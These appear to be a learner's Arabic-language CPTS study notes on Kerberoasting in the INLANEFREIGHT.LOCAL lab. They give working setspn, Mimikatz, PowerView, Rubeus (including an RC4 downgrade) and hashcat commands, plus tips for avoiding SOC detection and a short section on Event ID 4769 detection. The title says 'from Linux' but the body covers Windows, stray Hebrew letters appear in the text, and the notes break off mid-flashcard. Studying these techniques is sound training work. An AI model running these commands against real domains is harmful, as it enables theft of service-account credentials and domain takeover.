---
title: "SEC 18: Kerberoasting - from Linux"
module: "Active Directory Enumeration & Attacks"
section_num:
  - "18"
target: "INLANEFREIGHT.LOCAL"
tags:
  - CPTS
  - Active-Directory
  - Kerberoasting
difficulty: "Medium"
vectors: "LDAP / Kerberos"
tools: "GetUserSPNs.py · Hashcat · CrackMapExec"
status: 🟢 Complete
date: "2026-07-31"
---

> [!info] ⚙️ T4E CYBERPUNK NOTES ✦ CPTS CERTIFICATION PATHWAY
> 📍 **TARGET NODE:** INLANEFREIGHT.LOCAL
> 🔐 **ACCESS LEVEL:** Authenticated Domain User
> 📡 **ATTACK VECTOR:** LDAP / Kerberos
> 📋 **SECTION ID:** SEC-18
> ⚡ **DIFFICULTY:** 🟢 Medium
> 🏁 **STATUS:** 🟢 ONLINE — COMPLETE
> 🛠️ **KEY TOOLS:** GetUserSPNs.py · Hashcat · CrackMapExec
> 🎯 **CORE OBJECTIVE:** Extract and crack service tickets
> 📅 **DATE:** 2026-07-31

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║                      ████████╗██╗  ██╗███████╗                       ║
║                      ╚══██╔══╝██║  ██║██╔════╝                       ║
║                         ██║   ███████║█████╗                         ║
║                         ██║   ╚════██║██╔══╝                         ║
║                         ██║        ██║███████╗                       ║
║                         ╚═╝        ╚═╝╚══════╝                       ║
║                                                                      ║
║                       [ TECH FOR EVERYONE ]                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
║  [SECTION]  :: SEC-[NUM] // [REPLACE: SECTION_TITLE]                 ║
║  [DOMAIN]   :: [REPLACE: TARGET_DOMAIN.LOCAL]                        ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
╚══════════════════════════════════════════════════════════════════════╝
```

## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!success] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD
> **Language:** Arabic — **Size:** ~2,000 Words
> **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

[

تمام! استلمت نص السكشن. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ...

━━━━━

🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود؟

⚠️ تخيل وياي هذي القصة:

تخيل إنك معزوم بحفلة كبيرة داخل فندق فخم (هذا الفندق هو شبكة الـ Active Directory). بداخل هذا الفندق اكو غرف VIP مغلقة، مثل غرفة "السينما" أو غرفة "البوفيه" (هذي الغرف تمثل الخدمات Services مثل قواعد بيانات SQL).

نظام الفندق الأمني يشتغل كالتالي: إنت تروح لموظف الاستقبال (اللي هو الـ Domain Controller) وتقوله: "أريد أدخل لغرفة السينما". الموظف ما يروح يفتحلك الباب، بل يعطيك "تذكرة دخول" (Ticket). هذي التذكرة مغلفة ومقفلة بقفل سري... هذا القفل هو عبارة عن "الباسوورد الخاص بالغرفة نفسها". المفروض إنت تاخذ التذكرة، تروح توقف يم باب السينما، وتنطيها للحارس حتى يفتحها إلك.

لكن... إنت كـ (Hacker) راح تسوي حركة خبيثة. راح تاخذ التذكرة، وبدل ما تروح لغرفة السينما، راح تطلع من الفندق وترجع لبيتك! وببيتك، تجيب مطرقة وأدوات كسر (أداة Hashcat) وتظل تضرب بالقفل وتجرب ملايين المفاتيح لحد ما تكسر القفل. إذا انكسر القفل، إنت عرفت "الباسوورد الخاص بالغرفة"!

هذا بالضبط هو هجوم الـ **Kerberoasting**.

ليش هذا الخلل أو التقنية موجودة أصلاً؟

المشكلة مو ثغرة برمجية (Bug)، المشكلة بـ "تصميم" بروتوكول Kerberos نفسه! البروتوكول مصمم بحيث إن الـ Domain Controller لازم يشفر التذكرة بباسوورد الخدمة (الـ Service Account) حتى الخدمة تقدر تتأكد إن التذكرة أصلية بدون ما تضطر ترجع تسأل الـ DC كل مرة. المهاجم يستغل هذي الميزة الشرعية، يطلب تذكرة، وياخذها أوفلاين ويكسرها.

وين يظهر بالواقع؟

هذا الهجوم هو "الخبز اليومي" لأي Pentester. الحلو بي إنك ما تحتاج تكون Admin حتى تسويه. أي يوزر عادي جداً بالشركة (حتى لو موظف استعلامات) يقدر يطلب هذي التذاكر. الشركات تنضرب بهذا الهجوم لأنهم يخلون باسووردات ضعيفة لحسابات الـ Services (مثل `Welcome123`).

وين يقع هذا السكشن بخريطة CPTS؟

يقع في صميم مرحلة الـ Privilege Escalation (رفع الصلاحيات) و الـ Lateral Movement (التحرك الجانبي). بمجرد ما تكسر باسوورد خدمة مثل SQL، ممكن تصير Admin على هذا السيرفر، ومنه تسيطر على الشبكة.

شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟

١. راح تقدر تستخرج تذاكر الـ Kerberos من أي حاسبة ويندوز بطرق يدوية وأوتوماتيكية.

٢. راح تفهم أنواع التشفير (RC4 و AES) وكيف تجبر النظام يعطيك تشفير ضعيف.

٣. راح تقدر تجهز هذي التذاكر وتكسرها بأداة Hashcat لفتح حسابات مدراء الخدمات.

━━━━━

🔵 المرحلة 1: خريطة المفاهيم

خلينا نفلش السكشن وناخذ المصطلحات التقنية ونشرحها بالعراقي البسيط حتى من نقراها بالشرح تكون واضحة:

SPN (Service Principal Name - اسم الكيان الخدمي)

- شنو يعني بالعراقي؟ هو "الباج" أو "اللافتة" اللي تنحط على حساب بالويندوز حتى تقول: "يا جماعة، هذا الحساب مو حساب موظف بشري، هذا الحساب ديركض خدمة معينة (مثل قاعدة بيانات SQL أو ويب سيرفر)". الهجوم كله يعتمد على البحث عن الحسابات اللي بيها هاي اللافتة.
    
- مثال: `MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433`
    

TGS (Ticket Granting Service - تذكرة منح الخدمة)

- شنو يعني بالعراقي؟ هي "تذكرة الدخول" للغرفة اللي سولفنا عنها بالقصة. التذكرة اللي يعطيك إياها الـ DC حتى تروح تستخدم خدمة معينة. هذي التذكرة هي الهدف اللي راح نسرقه ونكسر تشفيره.
    

RC4 (Type 23)

- شنو يعني بالعراقي؟ خوارزمية تشفير قديمة وضعيفة جداً. بالـ Kerberos، إذا التذكرة مشفرة بـ RC4، الهاش مالتها يبدأ بـ `$krb5tgs$23$`. كسرها سهل وسريع جداً. المهاجمين يدعون ربهم يلقون هيج تذاكر.
    

AES 256 (Type 18)

- شنو يعني بالعراقي؟ خوارزمية تشفير حديثة وقوية. الهاش مالتها يبدأ بـ `$krb5tgs$18$`. كسرها ياخذ وقت أطول بكثير من الـ RC4، بس يظل ممكن إذا الباسوورد ضعيف.
    

Kirbi (.kirbi file)

- شنو يعني بالعراقي؟ هذا مجرد امتداد (صيغة ملف) ابتكرته أداة Mimikatz حتى تحفظ بيه تذاكر الـ Kerberos اللي تسرقها من الرام. نحتاج نحول هذا الملف لنص عادي يلا نقدر نكسره.
    

Downgrade Attack (هجوم خفض مستوى التشفير)

- شنو يعني بالعراقي؟ تخيل إن النظام يدعم تشفير قوي (AES)، بس إنت تخدعه وتقوله: "أنا حاسبتي قديمة وما تفهم غير RC4، فدوة دزلي التذكرة بـ RC4". النظام مرات يوافق وينطيك التشفير الضعيف، وهذا يسهل عليك الكسر.
    

LAPS (Local Administrator Password Solution)

- شنو يعني بالعراقي؟ برنامج من مايكروسوفت ينطي لكل حاسبة باسوورد عشوائي معقد للـ Admin. السكشن ذكره كطريقة لحماية حسابات الخدمات بدلاً من استخدام باسووردات بشرية ضعيفة.
    

━━━━━

🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

📖 ترجمة عنوان السكشن وموضوعه:

اسم السكشن "Kerberoasting - from Windows". وهو جزء من موديول هجمات الـ Active Directory. يعلمك كيف تنفذ هجوم الـ Kerberoasting وأنت جالس داخل بيئة ويندوز (سواء مخترق حاسبة موظف أو متصل بـ RDP).

🎯 ماذا يريد هذا السكشن أن تتعلم؟

بعد هذا السكشن، المفروض تكون قادر تـ:

١. تفهم ميكانيكية الهجوم اليدوية (كيف تستخرج الـ Ticket خطوة بخطوة من الذاكرة).

٢. تستخدم أدوات الأتمتة (PowerView و Rubeus) لتسريع العملية وسحب مئات التذاكر بثواني.

٣. التلاعب بنوع التشفير للهروب من الـ AES إلى הـ RC4.

٤. تجهيز التذاكر وكسرها بأداة Hashcat لتوليد الباسووردات الصريحة (Cleartext).

📐 هيكل المحتوى (Section Blueprint):

السكشن متدرج بشكل ذكي جداً، يبدأ من الصعب والمعقد، وينتهي بالسهل والأوتوماتيكي:

الجزء الأول: [الطريقة الشبه يدوية] — استخدام أوامر النظام `setspn` و كود `.NET` لجلب التذكرة، ثم `Mimikatz` لسرقتها، ثم أدوات لتحويل صيغتها (أطول وأعقد طريقة).

الجزء الثاني: [الطريقة الأوتوماتيكية الأولى] — استخدام `PowerView` (أسرع، بس إمكانياتها محدودة).

الجزء الثالث: [الطريقة الأوتوماتيكية الثانية - الوحش] — استخدام `Rubeus` (أفضل أداة بالعالم لهذا الهجوم)، مع شرح إمكانيات الـ Downgrade للـ RC4.

الجزء الرابع: [الكسر] — استخدام `Hashcat` لكسر ما جمعناه في الأجزاء السابقة.

الجزء الخامس: [الحماية والتحليل] — كيف يصيدنا الـ Blue Team (Event ID 4769).

تدفق التعلم:

```
[جمع حسابات الـ SPN]
       │
       ▼
[طلب تذاكر TGS لهذي الحسابات]
       │
       ├─────────────────────────┐
       ▼                         ▼
[يدوياً عبر PowerShell]   [آلياً عبر Rubeus/PowerView]
       │                         │
       ▼                         ▼
[استخراجها بـ Mimikatz]          │
       │                         │
       └────────────┬────────────┘
                    ▼
[تجهيز الهاش (Hashcat format)]
                    │
                    ▼
[كسر الهاش واستخراج الـ Cleartext Password]
```

🔗 المتطلبات السابقة:

لازم تكون فاهم شنو هو الـ Active Directory، وتعرف أساسيات بروتوكول Kerberos (شنو يعني TGT و TGS). ولازم تعرف كيف تستخدم أداة Hashcat.

🚪 ما يُفتح بعده:

هذا السكشن يفتحلك باب "التحكم بالسيرفرات". بمجرد ما تكسر باسوورد حساب SQL Service، راح تقدر تدخل لقاعدة البيانات وتنفذ أوامر (Command Execution) على السيرفر، وهذا يوديك للسكاشن المتقدمة.

⚠️ ما يذكره السكشن ضمنياً بدون توضيح:

- يفترض إنك تعرف كيف تنقل الملفات (مثل ملفات الـ .kirbi) من حاسبة الضحية إلى حاسبة الـ Kali Linux مالتك لكسرها.
    
- يفترض إنك تعرف إن تنفيذ Mimikatz و Rubeus بالواقع راح يضرب مليون إنذار للـ Antivirus، باللاب هم مسهلين الموضوع.
    

━━━━━

🟠 المرحلة 3: الشرح العميق

هسه وصلنا للزبدة. السكشن دسم ومليان تفاصيل، راح نقسمه لـ ٤ تقنيات رئيسية ونشرح كل وحدة بحيث تفهم الـ "ليش" قبل الـ "كيف".

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [١]: الطريقة الشبه يدوية (The Semi-Manual Method)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

قبل ما المبرمجين يخترعون أدوات بضغطة زر، الهاكرز كانوا يشتغلون بـ "العمل الشعبي". أول شي يستخدمون أداة ويندوز أصلية اسمها `setspn` حتى يلقون يا حسابات بيها SPN. بعدين يكتبون كود برمجي طويل بالـ PowerShell حتى يقولون للويندوز: "جيبلي تذكرة لهذي الخدمة". الويندوز راح يجيب التذكرة ويضمها بالرام (الذاكرة). هنا يجي دور `Mimikatz` حتى يسوي عملية جراحية للرام ويستخرج هاي التذكرة.

🎭 التشبيه:

تخيل إنك تريد تسرق وصفة طبخة سرية من مطعم. الطريقة اليدوية: تروح تقرأ المنيو (SPN)، تطلب الأكلة من الوتر (PowerShell)، ولما الأكلة تنزل عالطاولة، تاخذها للمختبر وتفكك مكوناتها (Mimikatz).

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Windows بي ميزة شرعية اسمها (Kerberos Ticket Cache). أي تذكرة تطلبها، الويندوز يضمها بالرام حتى لا يظل يطلبها كل شوية من السيرفر وتصير زحمة بالشبكة. المهاجمين استغلوا هذا "المخزن". الكود مال PowerShell اللي بالسكشن هو مجرد كود شرعي يطلب التذكرة ويخلي الويندوز يخزنها بشكل طبيعي جداً.

🔧 الخطوة ١: البحث عن الـ SPNs:

DOS

```
setspn.exe -Q */*
```

💬 شرح الـ flags:

`-Q */*`: تعني Query (استعلام). النجوم `*/*` تعني "ابحثلي عن أي خدمة وأي سيرفر بالدومين كله". راح يطبعلك لستة طويلة بكل الحسابات اللي دتشغل خدمات. إحنا ندور على حسابات "البشر" (User Accounts) ونتجاهل حسابات "الحاسبات" (Computer Accounts اللي تنتهي بـ `$`) لأن باسووردات الحاسبات معقدة جداً (120 حرف) ومستحيل تنكسر.

🔧 الخطوة ٢: طلب التذكرة وحفظها بالرام (استهداف יوزر sql):

PowerShell

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

💬 شرح الأوامر:

هذا كود .NET اصلي. نحمل مكتبة الـ `System.IdentityModel`، وبعدين نطلب أوبجكت اسمه `KerberosRequestorSecurityToken`. الـ `-ArgumentList` ننطيها اسم الـ SPN اللي لقيناه بالخطوة الأولى. بمجرد تنفيذ هذا الأمر، التذكرة صارت مخزونة بداخل رأس الحاسبة!

🔧 الخطوة ٣: استخراج التذكرة بـ Mimikatz:

DOS

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  
```

💬 شرح الـ flags:

- `base64 /out:true`: نطلب من ميميكاتز يطبعلنا التذكرة كـ نص مشفر (Base64) على الشاشة، بدل ما يسويها ملفات وندوخ بنقلها للكالي.
    
- `kerberos::list /export`: هذا الأمر السحري اللي يدخل للـ Ticket Cache بالرام، ويطبع كل التذاكر اللي يلقاها.
    

📤 الـ Output المتوقع:

راح يطلعلك بلوك طويل من الحروف الغريبة (Base64 Blob) يبدأ بـ `doIGPzCCB...` وينتهي بكلمة `.kirbi`. هذي هي التذكرة! بس بعدنا ما نقدر نكسرها، لازم نرتبها.

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

فهمنا ميكانيكية الهجوم من الصفر: بحثنا، طلبنا، سرقنا من الرام. بس الطريقة متعبة جداً ومليانة خطوات، خصوصاً إذا الدومين بي 1000 يوزر!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٢]: تجهيز التذكرة للكسر (Preparation & Cracking)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

هسه إحنا لزمنا التذكرة المشفرة (Base64) وصارت بحاسبة الكالي لينكس مالتنا. بس برنامج `Hashcat` (اللي يكسر الباسووردات) ما يفتهم هذا النص العشوائي. لازم نحول هذا النص إلى ملف `.kirbi`، وبعدين نستخدم سكربت اسمه `kirbi2john` حتى نترجمه للغة يفتهمها Hashcat.

🎭 التشبيه:

تخيل سرقت رسالة مشفرة بالروسي، والبرنامج اللي يفك التشفير مالتك يقرأ فرنسي بس. لازم توديها لمترجم (kirbi2john) يحولها للصيغة المناسبة قبل ما تبدأ عملية الكسر.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

تذاكر Kerberos تنحفظ بصيغة اسمها ASN.1 (صيغة باينري معقدة). Hashcat يحتاج الهاش يكون بـ Format محدد جداً (يعني يبدأ بـ `$krb5tgs$23$`) حتى يعرف يا خوارزمية يستخدم.

🔧 الخطوة ١: إزالة الفراغات وتحويل الـ Base64 لملف kirbi:

Code snippet

```
echo "<base64 blob>" |  tr -d \\n | base64 -d > sqldev.kirbi
```

💬 الشرح:

الـ `tr -d \\n` يمسح كل المسافات والأسطر المخربطة حتى يصير سطر واحد نظيف. الـ `base64 -d` يفك تشفير النص ويحفظه كملف باينري اسمه `sqldev.kirbi`.

🔧 الخطوة ٢: التحويل إلى صيغة Hashcat:

Code snippet

```
python2.7 kirbi2john.py sqldev.kirbi > crack_file
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

💬 الشرح:

استخدمنا السكربت `kirbi2john.py`. أمر الـ `sed` (أداة تعديل النصوص باللينكس) شغلته بسيطة: يضيف رقم `23$` واسم الفايل بداخل الهاش حتى Hashcat يقرأه بدون مشاكل. الـ Output النهائي هو اللي راح نكسره.

🔧 الخطوة ٣: الكسر بـ Hashcat:

Code snippet

```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

💬 شرح الـ flags:

- `-m 13100`: هذا المود (Mode) الخاص بكسر تذاكر Kerberos نوع RC4 (Type 23).
    
- `/usr/share/wordlists/rockyou.txt`: هذا القاموس اللي بي ملايين الباسووردات المسربة اللي راح نجربها واحد واحد.
    

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

عرفنا إن سرقة التذكرة هي نص الشغل، والنص الثاني هو "تنظيفها وتهيئتها" حتى نعلفها لبرنامج Hashcat.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٣]: الأتمتة والسرعة (PowerView & Rubeus)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

ليش نسوي كل هاي الدوخة (10 أوامر و Mimikatz وتحويلات) بينما نقدر نسويها بأمر واحد؟ أدوات الـ PowerView والـ Rubeus اختصرت كل شي: تبحث عن الـ SPN، تطلب التذكرة، وتحولها لصيغة Hashcat، وتعرضها الك عالشاشة بثانية وحدة!

🎭 التشبيه:

الطريقة اليدوية مثل واحد يزرع طماطة، يقطفها، يعصرها، ويطبخها. أداة Rubeus مثل واحد يفتح تطبيق Delivery ويطلب معجون طماطة جاهز يوصله للبيت بدقيقة.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

مبرمجين هذي الأدوات فهموا الـ API مال الويندوز، فخلوا الأداة تتكلم مباشرة مع الـ Domain Controller، تطلب التذاكر بالخلفية، وبدل ما تخليها تنزل للـ RAM (ونحتاج Mimikatz نطلعها)، الأداة تلتقطها وهي طايرة بالشبكة وتطبعلك إياها جاهزة للكسر.

🔧 استخدام PowerView:

PowerShell

```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

💬 الشرح:

شوف البساطة! اطلب اليوزر، سلم نتيجته (عبر הـ Pipe) للأمر الثاني اللي يسحب التذكرة، وقوله `-Format Hashcat` حتى يعطيك إياها منظفة وجاهزة بدون kirbi2john ولا دوخة.

🔧 استخدام Rubeus (أقوى أداة):

PowerShell

```
# 1. Gather stats first without triggering alarms
.\Rubeus.exe kerberoast /stats

# 2. Roast specific high-value targets and get Hashcat format
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

💬 شرح الـ flags:

- `/stats`: تسويلك إحصائية (كم يوزر مصاب؟ يا نوع تشفير؟ متى آخر مرة غيروا الباسوورد؟) بدون ما تطلب تذاكر (صامت جداً وممتاز للـ OpSec).
    
- `/ldapfilter:'admincount=1'`: بدل ما تسحب كل التذاكر وتفضح نفسك، هذا הפلتر يقوله: "اسحبلي تذاكر المدراء فقط".
    
- `/nowrap`: يطبع الهاش الطويل بسطر واحد بدون ما يكسره بأسطر جديدة، حتى تاخذه Copy-Paste للهاشكات مباشرة.
    

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

Rubeus هو الملك. بضغطة زر يسوي إحصائيات، يفلتر الأهداف الدسمة، وينطيك التذكرة جاهزة للكسر.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٤]: حرب التشفير (RC4 vs AES & Downgrade)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

السكشن يكولك معلومة خطيرة: تذاكر الـ RC4 (اللي رقمها 23) تنكسر بثواني، بينما תذاكر الـ AES (اللي رقمها 18) قوية جداً وتاخذ أيام أو أسابيع للكسر. المشكلة إذا الشركة محدثة سيرفراتها، راح ينطوك AES. بس Rubeus بي ميزة شيطانية: يقدر يتوسل بالسيرفر حتى ينزل مستوى التشفير للـ RC4!

🎭 التشبيه:

مثل ما تروح لمحل يبيع بضاعة غالية بالدولار (AES). بس إنت تكوله: "عمي أنا رجال فقير ما عندي غير دينار عراقي (RC4)". المحل مرات يتساهل وياك ويبيعلك بالدينار لأن نظامه قديم ويقبل العملتين!

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Active Directory يحب الـ Backwards Compatibility (دعم الأنظمة القديمة). إذا طلبنا تذكرة وقولنا للـ DC "أنا ادعم بس RC4"، الـ DC غالباً راح ينزل مستوى التشفير وينطينا التذكرة بـ RC4 حتى لا ينقطع الاتصال! هذا الخلل اسمه Downgrade Attack.

🔧 أمر إجبار الـ RC4 بـ Rubeus:

PowerShell

```
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

💬 شرح الـ flags:

- `/tgtdeleg`: هذا الفلاج هو اللي ينفذ السحر. يخلي Rubeus يرسل الطلب بصيغة توهم الـ DC إنه لازم يستخدم RC4 حصراً.
    

⚠️ استثناء مهم (Windows Server 2019):

السكشن وضح نقطة جوهرية: إذا كان الـ Domain Controller من نوع Windows Server 2019 فما فوق، هذا الهجوم (Downgrade) **راح يفشل**! مايكروسوفت سدوا هاي الثغرة، والسيرفر راح ينطيك AES غصباً عنك (إلا إذا الأدمن مسوي مصيبة وموقف הـ AES يدوياً بالـ Group Policy).

🔧 كسر الـ AES بـ Hashcat:

إذا حصلت تذكرة AES (تبدأ بـ `$krb5tgs$18$`)، راح تستخدم مود ثاني:

Code snippet

```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

💬 الشرح:

المود `19700` مخصص للـ AES. הסكشن يراويك بالصور إن كسر الـ RC4 أخذ 4 ثواني، بينما הـ AES أخذ 4 دقائق وشوية لنفس الباسوورد! تخيل لو الباسوورد معقد، الـ AES راح ياخذ سنين.

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

تعلمنا إن الـ RC4 هو صديق المخترق، وإننا نحاول نجبر السيرفر عليه بـ `/tgtdeleg`، بس إذا اصطدمنا بسيرفر 2019 حديث، لازم نرضى بالـ AES ونستخدم حواسيب كسر (GPU Rigs) قوية.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 ملخص ما تعلمنا:

|**التقنية / الأداة**|**وظيفتها بالـ Kerberoasting**|**متى نستخدمها؟**|
|---|---|---|
|`setspn.exe` + `.NET`|الطريقة اليدوية العتيقة للبحث والطلب|إذا أدوات الاختراق محظورة تماماً والـ AV مشتغل.|
|`Mimikatz`|استخراج التذكرة من الذاكرة|مكمل للطريقة اليدوية (يتطلب Admin أحياناً).|
|`kirbi2john.py`|تحويل الملفات للغة الهاشكات|إذا حصلنا على تذاكر بصيغة `.kirbi` أو Base64 خام.|
|`Rubeus /stats`|استطلاع صامت للأهداف|في بداية الهجوم لتقييم الوضع بدون إثارة إنذارات.|
|`Rubeus /nowrap`|سحب التذاكر جاهزة للكسر|هي الطريقة الذهبية والأسرع بالواقع واللابات.|
|`Hashcat -m 13100`|كسر التذاكر نوع RC4|لفك التشفير الضعيف (Type 23).|
|`Hashcat -m 19700`|كسر التذاكر نوع AES|لفك التشفير القوي (Type 18).|

━━━━━

🔴 المرحلة 4: ما لا يقوله السكشن

السكشن ممتاز، بس أكو أسرار ميدانية و Gotchas لازم تعرفها كـ Pentester محترف:

🕳️ الثغرات في شرح السكشن:

١. ليش حذرنا من سحب حسابات الكمبيوتر؟

السكشن قال "ignore the computer accounts" بس ما تعمق ليش. حسابات الكمبيوتر (اللي تنتهي بعلامة `$`) يتم إدارتها أوتوماتيكياً من قبل الويندوز. الويندوز يغير باسوورداتها كل 30 يوم، والباسوورد يكون طوله 120 حرف عشوائي معقد! يعني مستحيل، حرفياً مستحيل تكسرها بـ Hashcat. سحب تذاكرها هو مجرد إثارة ضوضاء للـ Blue Team (Noise) بدون أي فائدة.

٢. سرعة الـ Rubeus ومشاكل הـ OpSec:

السكشن كلك استخدم Rubeus. بس بالـ Red Teaming، إذا شغلت Rubeus بدون تحديد، راح يطلب مئات التذاكر بأجزاء من الثانية. هذا الـ Spike (الارتفاع المفاجئ) بطلبات TGS راح يخلي أي نظام SOC أو SIEM يصرخ ويجمد حسابك. لذلك المحترفين يستخدمون الفلاج `/delay` و `/jitter` حتى يطلبون تذكرة وحدة كل 5 دقائق، وكأنهم يوزر طبيعي.

⚠️ الـ Gotchas عند تطبيق هذا بالـ Lab:

١. مشكلة الـ Clock Skew (تزامن الوقت):

بروتوكول Kerberos حساس جداً للوقت. إذا الوقت بحاسبتك الكالي متأخر أو متقدم بـ 5 دقائق عن الـ Domain Controller، كل التذاكر راح تنرفض والسكربتات راح تفشل وتنطيك Error. دائماً تأكد إن وقتك متزامن وي السيرفر قبل لا تسوي Kerberoasting من خارج الويندوز.

٢. مشكلة הـ Base64 بالـ Mimikatz:

السكشن يستخدم `mimikatz # base64 /out:true`. مرات بالـ Labs من تسوي نسخ (Copy) لهذا النص الطويل من الشاشة، يصير بي مسافات وهمية (White spaces) أو ينقص حرف بسبب الـ Terminal. من تسويله Decode راح يفسد الملف و Hashcat يرفضه. الحل الأفضل هو دائماً حفظها كملفات إذا استطعت بدل النسخ واللصق.

🔗 ربط بسكاشن/موديولات أخرى:

هذا السكشن مرتبط بشدة بموديول `Active Directory BloodHound`. بالـ BloodHound، اليوزر اللي تقدر تسويله Kerberoasting راح يطلعلك إياه بوضوح (Kerberoastable edge). ومرتبط بـ `Password Attacks` لأن قوة الـ Kerberoasting كلها تعتمد على قوة القاموس (Wordlist) مالتك وقوة حاسبة الكسر.

🌍 السياق الحقيقي (Real Pentest Context):

بالواقع، إذا قدرت تكسر باسوورد حساب SPN، فهذا الحساب غالباً يملك صلاحيات عالية (مثل Local Admin) على السيرفر اللي هو يديره (مثلاً سيرفر הـ SQL). وأحياناً، لكسل الأدمنية، يكون هذا الحساب عضو بـ Domain Admins! يعني كسرة وحدة لـ RC4 hash تنهي لك الدومين بالكامل.

🏆 النصيحة الذهبية للـ CPTS Exam:

بامتحان הـ CPTS، من تلقى حسابات SPN، دائماً فلتر وبحث عن **حسابات الـ IT أو حسابات الإدارة** أولاً. لا تضيع وقتك الثمين بكسر باسوورد حساب خدمة ضعيف ما يمتلك أي صلاحيات إضافية. استخدم PowerView لفحص الجروبات اللي ينتمي إلها حساب הـ SPN قبل لا ترهق حاسبتك بالكسر.

━━━━━

💎 الفلاشكاردز — ملخص السكشن للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو حساب الـ SPN (Service Principal Name)؟

✅ Back: هو حساب بالـ Active Directory تم ربطه بخدمة معينة (مثل SQL أو Web) ليسمح بتسجيل الدخول عبر بروتوكول Kerberos.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: في هجوم Kerberoasting، ما هو نوع التذكرة التي يستهدفها المهاجم ولماذا؟

✅ Back: يستهدف تذكرة הـ TGS (Ticket Granting Service) لأن جزءاً منها مشفر بكلمة سر حساب הـ SPN (الخدمة)، مما يسمح بكسره Offline.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الفرق بين تشفير Type 23 و Type 18 في Kerberos؟

✅ Back: الـ Type 23 هو تشفير RC4 القديم والضعيف (سهل الكسر). الـ Type 18 هو تشفير AES 256 الحديث والقوي (يصعب كسره).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ماذا تفعل ميزة `/tgtdeleg` في أداة Rubeus؟

✅ Back: تقوم بهجوم Downgrade (خفض التشفير) لإجبار الـ Domain Controller على إعطائنا تذكرة TGS بتشفير RC4 الضعيف بدلاً من AES.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: لماذا يفشل هجوم خفض التشفير (RC4 Downgrade) في الأنظمة الحديثة؟

✅ Back: لأن أنظمة Windows Server 2019 Domain Controllers تمنع خفض التشفير وتفرض إعطاء التذكرة بأعلى تشفير مدعوم (AES) بغض النظر عن طلب المهاجم.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف يمكن للـ Blue Team اكتشاف هجوم Kerberoasting؟

✅ Back: عن طريق مراقبة الارتفاع غير الطبيعي في الحدث رقم (Event ID 4769) والذي يمثل طلبات TGS Service Ticket.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: لماذا يجب تجاهل Computer Accounts عند جمع الـ SPNs؟

